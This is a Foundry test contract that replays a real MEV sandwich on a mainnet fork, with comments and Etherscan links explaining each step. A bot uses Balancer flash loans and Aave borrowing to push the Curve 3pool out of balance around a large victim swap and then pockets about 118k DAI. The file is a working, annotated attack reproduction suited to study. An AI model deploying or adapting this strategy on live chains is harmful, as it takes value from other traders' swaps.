// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import "forge-std/Test.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";
import "../interface/WETHGateway.sol";
import "../interface/Vault.sol";
import "../interface/LendingPool.sol";
import "../interface/CurvePool.sol";
import "../interface/Maker.sol";

contract MEVSimulation is Test {
    using SafeERC20 for IERC20;

    WETHGateway wethGateway = WETHGateway(0xcc9a0B7c43DC2a5F023Bb9b738E45B0Ef6B06E04);
    LendingPool lendingPool = LendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    Vault balancer = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 variableDebtDAI = IERC20(0x6C3c78838c761c6Ac7bE9F59fe808ea2A6E4379d);
    IERC20 variableDebtUSDC = IERC20(0x619beb58998eD2278e08620f97007e1116D5D25b);
    CurvePool curvePool = CurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7); // 3pool: DAI/USDC/USDT
    Maker maker = Maker(0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A); // USDC <-> DAI

    function setUp() public {
        WETH.approve(address(lendingPool), type(uint).max);
        USDT.safeApprove(address(curvePool), type(uint).max); // USDT is not standard ERC20 thus need use saveApprove
        USDC.approve(address(curvePool), type(uint).max);
        USDC.approve(address(lendingPool), type(uint).max);
        USDC.approve(maker.gemJoin(), type(uint).max); // deposit USDC mint DAI -> approve maker.gemJoin()
        DAI.approve(address(curvePool), type(uint).max);
        DAI.approve(address(lendingPool), type(uint).max);
        DAI.approve(address(maker), type(uint).max); // burn DAI withdraw USDC -> approve maker
    }

    function testMEV() public {
        // First transaction: MEV bot
        // https://etherscan.io/tx/0xada54289d2a5556b2aa8f6ca26317a0649397fff8babd7a5bb6f6270815c8a8e
        // Deposit ~2423 ETH into Aave with own funds
        wethGateway.depositETH{value: 2423.269114336461463776 ether}(address(lendingPool), address(this), 0);
        // Flash loan all available WETH from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint[] memory amounts = new uint[](1);
        amounts[0] = WETH.balanceOf(address(balancer));
        balancer.flashLoan(address(this), tokens, amounts, "0");

        // Second transaction: simulate random big amount of swap in Curve
        // https://etherscan.io/tx/0x29afdc352692a037a80d871fce20dd7515b70313860a63220c57529022ab22c7
        deal(address(USDT), address(this), 5_400_000e6);
        curvePool.exchange(2, 1, USDT.balanceOf(address(this)), 0);
        // console.log(USDC.balanceOf(address(this))); // 5,244,206.001950
        // 5,391,993.496993 without pool manipulation
        deal(address(USDC), address(this), 0); // reset USDC balance in this address to 0 for precise calculation of USDC later

        // Third transaction: MEV bot
        // https://etherscan.io/tx/0x125f8af2870daa4b00f55e3b6b2d368a409e3b056b1ab6a2dbbcd1a554bd79e1
        // Flash loan all available WETH from Balancer again
        balancer.flashLoan(address(this), tokens, amounts, "1");
    }

    function receiveFlashLoan(address[] memory tokens, uint[] memory amounts, uint[] memory feeAmounts, bytes memory userData) external {
        if (keccak256(userData) == keccak256(bytes("0"))) {
            // Flash loan of first transaction
            // Deposit all WETH into Aave
            lendingPool.deposit(address(WETH), amounts[0], address(this), 0);
            // Borrow 145m DAI
            lendingPool.borrow(address(DAI), 145_000_000 ether, 2, 0, address(this)); // 2 for variable debt
            // Swap 145m DAI for ~144.4m USDC on Curve
            curvePool.exchange(0, 1, 145_000_000 ether, 0); // 0 - DAI, 1 - USDC, 2 - USDT
            // console.log(USDC.balanceOf(address(this))); // 144,408,098.131763
            // Deposit USDC into Maker for exact same amount of DAI
            maker.sellGem(address(this), USDC.balanceOf(address(this)));
            // Partially repay debt of DAI (because of the slippage in Curve, bot can't repay exact 145M of DAI)
            lendingPool.repay(address(DAI), DAI.balanceOf(address(this)), 2, address(this));
            // console.log(variableDebtDAI.balanceOf(address(this))); // left 591,901.868237000000000000 debt of DAI
            // Withdraw enough WETH to repay Balancer flash loan
            lendingPool.withdraw(address(WETH), amounts[0], address(this));
            WETH.transfer(address(balancer), amounts[0]);
        } else {
            // Flash loan of third transaction
            // Deposit all WETH into Aave
            lendingPool.deposit(address(WETH), amounts[0], address(this), 0);
            // Borrow 145m USDC
            // In actual tx is 144,513,418.519276 USDC, no idea why this amount
            lendingPool.borrow(address(USDC), 145_000_000e6, 2, 0, address(this));
            // Swap 145m USDC for ~145.7m DAI on Curve
            curvePool.exchange(1, 0, USDC.balanceOf(address(this)), 0);
            // console.log(DAI.balanceOf(address(this))); // 145,710,627.622905988349865110
            // Repay balance debt of DAI (~591k)
            lendingPool.repay(address(DAI), variableDebtDAI.balanceOf(address(this)), 2, address(this));
            // console.log(DAI.balanceOf(address(this))); // 145,118,725.754668988349865110
            // Deposit 145m DAI into Maker for exact same amount of USDC
            maker.buyGem(address(this), 145_000_000e6); // Second parameter is the amount of USDC to receive
            // Repay 145m debt of USDC
            lendingPool.repay(address(USDC), 145_000_000e6, 2, address(this));
            // Withdraw out all WETH
            (uint totalCollateralETH,,,,,) = lendingPool.getUserAccountData(address(this));
            lendingPool.withdraw(address(WETH), totalCollateralETH, address(this));
            // console.log(WETH.balanceOf(address(this))); // 134,129.058065368623593280
            // Repay Balancer flash loan
            WETH.transfer(address(balancer), amounts[0]);
            // console.log(DAI.balanceOf(address(this))); // 118,725.754668988349865110 (profit)
            // console.log(WETH.balanceOf(address(this))); // 2,423.269114336461463776
        }
        tokens; // ignore
        feeAmounts; // no fee yet for Balancer flashloan
    }
}
